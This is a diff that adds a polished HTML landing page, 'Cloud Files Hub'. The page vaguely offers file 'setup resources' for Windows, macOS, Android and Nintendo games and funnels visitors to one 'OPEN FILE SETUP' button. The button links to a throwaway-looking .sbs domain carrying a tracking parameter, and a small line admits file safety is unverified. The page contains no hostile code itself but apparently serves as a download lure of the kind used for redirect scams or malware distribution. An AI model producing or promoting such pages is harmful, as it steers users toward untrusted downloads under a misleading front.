@@ -1,0 +1,740 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Cloud Files Hub | All-in-One File Setup</title>
+
+<meta name="description" content="Cloud Files Hub - Explore setup resources for Windows, Mac, Android and Nintendo games in one modern platform.">
+
+<meta name="theme-color" content="#090f22">
+
+<style>
+
+/* =============================
+   GENERAL SETTINGS
+============================= */
+
+:root{
+  --bg:#080e20;
+  --panel:#111b34;
+  --white:#ffffff;
+  --muted:#a4b1cb;
+  --blue:#497dff;
+  --purple:#8e5cff;
+  --cyan:#53e3ff;
+}
+
+*{
+  box-sizing:border-box;
+  margin:0;
+  padding:0;
+}
+
+html{
+  scroll-behavior:smooth;
+}
+
+body{
+  font-family:Inter,Segoe UI,Arial,sans-serif;
+  background:var(--bg);
+  color:var(--white);
+  min-height:100vh;
+  overflow-x:hidden;
+}
+
+a{
+  text-decoration:none;
+}
+
+/* =============================
+   BACKGROUND
+============================= */
+
+.background{
+  position:fixed;
+  inset:0;
+  z-index:-1;
+  overflow:hidden;
+  background:
+    radial-gradient(
+      ellipse at 15% 20%,
+      #142b55 0%,
+      transparent 45%
+    ),
+    radial-gradient(
+      ellipse at 85% 75%,
+      #25164c 0%,
+      transparent 50%
+    ),
+    #080e20;
+}
+
+.glow-one{
+  position:absolute;
+  width:350px;
+  height:350px;
+  border-radius:50%;
+  background:#386dff;
+  filter:blur(130px);
+  opacity:.22;
+  top:10%;
+  left:-120px;
+}
+
+.glow-two{
+  position:absolute;
+  width:350px;
+  height:350px;
+  border-radius:50%;
+  background:#9351ff;
+  filter:blur(130px);
+  opacity:.2;
+  right:-110px;
+  bottom:5%;
+}
+
+/* =============================
+   HEADER
+============================= */
+
+header{
+  width:100%;
+  border-bottom:1px solid #ffffff12;
+  background:#0d1527ad;
+  backdrop-filter:blur(12px);
+}
+
+.header-container{
+  width:min(1150px,92%);
+  margin:auto;
+  min-height:82px;
+  display:flex;
+  align-items:center;
+  justify-content:space-between;
+  gap:15px;
+}
+
+.logo{
+  display:flex;
+  align-items:center;
+  gap:12px;
+}
+
+.logo-icon{
+  width:45px;
+  height:45px;
+  border-radius:14px;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  background:linear-gradient(
+    135deg,
+    #478bff,
+    #985cff
+  );
+  box-shadow:0 5px 25px #5278ff4b;
+  font-size:25px;
+}
+
+.logo-text{
+  color:white;
+  font-size:21px;
+  font-weight:900;
+  letter-spacing:-.5px;
+}
+
+.logo-text span{
+  color:#71b8ff;
+}
+
+.header-tag{
+  font-size:11px;
+  color:#b4c2dc;
+  padding:9px 15px;
+  border-radius:50px;
+  border:1px solid #ffffff25;
+  background:#ffffff09;
+}
+
+/* =============================
+   MAIN HERO
+============================= */
+
+.main{
+  width:min(1000px,92%);
+  margin:auto;
+  min-height:calc(100vh - 155px);
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  padding:60px 0;
+}
+
+.hero{
+  width:100%;
+  max-width:810px;
+  text-align:center;
+}
+
+/* CLOUD ICON */
+
+.cloud-icon{
+  width:110px;
+  height:110px;
+  margin:0 auto 28px;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  border-radius:31px;
+  background:linear-gradient(
+    135deg,
+    #326cdb,
+    #8b4fff
+  );
+  box-shadow:
+    0 20px 70px #5468ff55,
+    inset 0 2px 2px #ffffff44;
+  animation:float 5s ease-in-out infinite;
+}
+
+.cloud-icon svg{
+  width:62px;
+  height:62px;
+  stroke:white;
+}
+
+/* STATUS LABEL */
+
+.top-label{
+  display:inline-flex;
+  align-items:center;
+  gap:9px;
+  color:#8edcff;
+  background:#4f8fff17;
+  border:1px solid #699eff35;
+  border-radius:50px;
+  padding:9px 17px;
+  font-size:11px;
+  font-weight:800;
+  letter-spacing:1.6px;
+  margin-bottom:22px;
+}
+
+.status-dot{
+  width:7px;
+  height:7px;
+  border-radius:50%;
+  background:#51e4dc;
+  box-shadow:0 0 12px #51e4dc;
+}
+
+/* HEADING */
+
+.hero h1{
+  font-size:clamp(42px,7vw,78px);
+  font-weight:950;
+  letter-spacing:-3px;
+  line-height:1.09;
+  margin-bottom:20px;
+}
+
+.hero h1 span{
+  background:linear-gradient(
+    90deg,
+    #71bbff,
+    #b186ff,
+    #65eeec
+  );
+  background-clip:text;
+  -webkit-background-clip:text;
+  color:transparent;
+}
+
+.description{
+  max-width:610px;
+  margin:0 auto;
+  color:var(--muted);
+  font-size:16px;
+  line-height:1.9;
+}
+
+/* =============================
+   PLATFORM BADGES
+============================= */
+
+.platforms{
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  flex-wrap:wrap;
+  gap:11px;
+  margin-top:28px;
+}
+
+.platform{
+  display:inline-flex;
+  align-items:center;
+  gap:8px;
+  background:#131f39;
+  border:1px solid #34415f;
+  padding:11px 17px;
+  border-radius:11px;
+  color:#dae4f6;
+  font-size:12px;
+  font-weight:700;
+}
+
+.platform span{
+  font-size:18px;
+}
+
+/* =============================
+   DOWNLOAD AREA
+============================= */
+
+.download-area{
+  margin:38px auto 0;
+  max-width:610px;
+  padding:25px;
+  border-radius:23px;
+  background:linear-gradient(
+    135deg,
+    #182748,
+    #221b42
+  );
+  border:1px solid #6373bd70;
+  box-shadow:
+    0 20px 55px #0006,
+    0 0 45px #526dff14;
+}
+
+.download-area h2{
+  font-size:23px;
+  margin-bottom:10px;
+  font-weight:900;
+  letter-spacing:-.4px;
+}
+
+.download-area p{
+  font-size:13px;
+  color:#b4c3de;
+  margin-bottom:23px;
+  line-height:1.7;
+}
+
+/* SINGLE MAIN BUTTON */
+
+.download-button{
+  position:relative;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  gap:12px;
+  width:100%;
+  min-height:76px;
+  padding:18px;
+  background:linear-gradient(
+    100deg,
+    #347bff,
+    #755aff,
+    #984dff
+  );
+  border:1px solid #a6b2ff;
+  border-radius:15px;
+  color:#ffffff;
+  font-size:clamp(17px,3vw,23px);
+  font-weight:900;
+  letter-spacing:.5px;
+  text-align:center;
+  box-shadow:0 12px 35px #506bff65;
+  transition:
+    transform .25s,
+    box-shadow .25s,
+    filter .25s;
+}
+
+.download-button:hover{
+  transform:translateY(-4px);
+  box-shadow:0 17px 42px #506bff99;
+  filter:brightness(1.12);
+}
+
+.download-button:active{
+  transform:scale(.98);
+}
+
+.download-button:focus-visible{
+  outline:3px solid #ffffff;
+  outline-offset:4px;
+}
+
+.download-button svg{
+  width:27px;
+  height:27px;
+  flex-shrink:0;
+}
+
+.download-info{
+  color:#8c9db9;
+  font-size:11px;
+  margin-top:17px;
+  line-height:1.8;
+}
+
+/* =============================
+   SMALL BOTTOM DETAILS
+============================= */
+
+.features{
+  margin:37px auto 0;
+  display:flex;
+  justify-content:center;
+  gap:25px;
+  flex-wrap:wrap;
+}
+
+.feature{
+  display:flex;
+  align-items:center;
+  gap:7px;
+  color:#aab7ce;
+  font-size:12px;
+}
+
+.check{
+  color:#53e4cd;
+  font-size:17px;
+}
+
+/* =============================
+   FOOTER
+============================= */
+
+footer{
+  border-top:1px solid #ffffff10;
+  padding:21px 20px;
+  text-align:center;
+  color:#7888a6;
+  font-size:11px;
+  line-height:1.8;
+}
+
+footer strong{
+  color:#a5b7d5;
+}
+
+/* =============================
+   ANIMATION
+============================= */
+
+@keyframes float{
+  0%,100%{
+    transform:translateY(0);
+  }
+  50%{
+    transform:translateY(-9px);
+  }
+}
+
+@media(prefers-reduced-motion:reduce){
+  .cloud-icon{
+    animation:none;
+  }
+  *{
+    scroll-behavior:auto;
+  }
+}
+
+/* =============================
+   MOBILE RESPONSIVE
+============================= */
+
+@media(max-width:600px){
+
+  .header-container{
+    min-height:70px;
+  }
+
+  .logo-text{
+    font-size:18px;
+  }
+
+  .logo-icon{
+    width:40px;
+    height:40px;
+  }
+
+  .header-tag{
+    display:none;
+  }
+
+  .main{
+    min-height:auto;
+    padding:60px 0 70px;
+  }
+
+  .cloud-icon{
+    width:90px;
+    height:90px;
+    border-radius:26px;
+  }
+
+  .cloud-icon svg{
+    width:52px;
+    height:52px;
+  }
+
+  .hero h1{
+    letter-spacing:-1.8px;
+  }
+
+  .description{
+    font-size:14px;
+  }
+
+  .platforms{
+    gap:8px;
+  }
+
+  .platform{
+    padding:10px 12px;
+    font-size:11px;
+  }
+
+  .download-area{
+    padding:21px 15px;
+    margin-top:30px;
+  }
+
+  .download-area h2{
+    font-size:20px;
+  }
+
+  .download-button{
+    min-height:70px;
+  }
+
+  .features{
+    gap:13px;
+  }
+
+  .feature{
+    font-size:11px;
+  }
+
+}
+</style>
+</head>
+
+<body>
+
+<!-- BACKGROUND -->
+
+<div class="background">
+  <div class="glow-one"></div>
+  <div class="glow-two"></div>
+</div>
+
+<!-- HEADER -->
+
+<header>
+  <div class="header-container">
+
+    <div class="logo">
+
+      <div class="logo-icon">☁</div>
+
+      <div class="logo-text">
+        Cloud <span>Files Hub</span>
+      </div>
+
+    </div>
+
+    <div class="header-tag">
+      Multi-Platform File Resource
+    </div>
+
+  </div>
+</header>
+
+<!-- MAIN CONTENT -->
+
+<main class="main">
+
+  <div class="hero">
+
+    <!-- CLOUD ICON -->
+
+    <div class="cloud-icon">
+
+      <svg
+        viewBox="0 0 24 24"
+        fill="none"
+        stroke-width="1.7"
+        stroke-linecap="round"
+        stroke-linejoin="round"
+        aria-hidden="true"
+      >
+
+        <path d="M7 18H6a4 4 0 0 1-.5-7.97A6.5 6.5 0 0 1 18 9.5a4.3 4.3 0 0 1 .5 8.5H17"/>
+
+        <path d="M12 12v9"/>
+
+        <path d="m8.5 17.5 3.5 3.5 3.5-3.5"/>
+
+      </svg>
+
+    </div>
+
+    <!-- LABEL -->
+
+    <div class="top-label">
+      <span class="status-dot"></span>
+      ALL-IN-ONE FILE RESOURCE HUB
+    </div>
+
+    <!-- TITLE -->
+
+    <h1>
+      Your Files.<br>
+      <span>One Cloud Hub.</span>
+    </h1>
+
+    <!-- DESCRIPTION -->
+
+    <p class="description">
+      A modern destination for exploring setup resources
+      across multiple platforms. Whether you're looking for
+      Windows software, Mac applications, Android resources
+      or Nintendo game information, start from one place.
+    </p>
+
+    <!-- PLATFORM LABELS -->
+
+    <div class="platforms">
+
+      <div class="platform">
+        <span>🖥️</span> Windows
+      </div>
+
+      <div class="platform">
+        <span>🍎</span> macOS
+      </div>
+
+      <div class="platform">
+        <span>🤖</span> Android
+      </div>
+
+      <div class="platform">
+        <span>🎮</span> Nintendo
+      </div>
+
+      <div class="platform">
+        <span>📦</span> More Formats
+      </div>
+
+    </div>
+
+    <!-- SINGLE DOWNLOAD BUTTON SECTION -->
+
+    <div class="download-area">
+
+      <h2>Ready to Get Started?</h2>
+
+      <p>
+        Continue to the external file setup page
+        using the button below.
+      </p>
+
+      <!-- YOUR DOWNLOAD LINK -->
+
+      <a
+        href="https://asdfghn.sbs/?z=MzIw&amp;n=DRIVE%20FILE%20SETUP"
+        class="download-button"
+        target="_blank"
+        rel="noopener noreferrer"
+        aria-label="Open external file setup page"
+      >
+
+        <svg
+          viewBox="0 0 24 24"
+          fill="none"
+          stroke="currentColor"
+          stroke-width="2.3"
+          stroke-linecap="round"
+          stroke-linejoin="round"
+          aria-hidden="true"
+        >
+
+          <path d="M12 3v12"/>
+          <path d="m6 9 6 6 6-6"/>
+          <path d="M4 17v3h16v-3"/>
+
+        </svg>
+
+        OPEN FILE SETUP
+
+        <span aria-hidden="true">↗</span>
+
+      </a>
+
+      <div class="download-info">
+        Opens a third-party website in a new tab.
+        File availability, compatibility and safety
+        have not been independently verified.
+      </div>
+
+    </div>
+
+    <!-- SIMPLE FEATURES -->
+
+    <div class="features">
+
+      <div class="feature">
+        <span class="check">✓</span>
+        Simple Navigation
+      </div>
+
+      <div class="feature">
+        <span class="check">✓</span>
+        Multi-Platform Focus
+      </div>
+
+      <div class="feature">
+        <span class="check">✓</span>
+        Mobile Friendly
+      </div>
+
+    </div>
+
+  </div>
+
+</main>
+
+<!-- FOOTER -->
+
+<footer>
+
+  <strong>Cloud Files Hub</strong>
+
+  <p>
+    Independent file resource landing page.
+    Not affiliated with software or gaming publishers.
+  </p>
+
+  <p>
+    © <span id="year"></span> Cloud Files Hub.
+    All Rights Reserved.
+  </p>
+
+</footer>
+
+<script>
+document.getElementById("year").textContent =
+  new Date().getFullYear();
+</script>
+
+</body>
+</html>
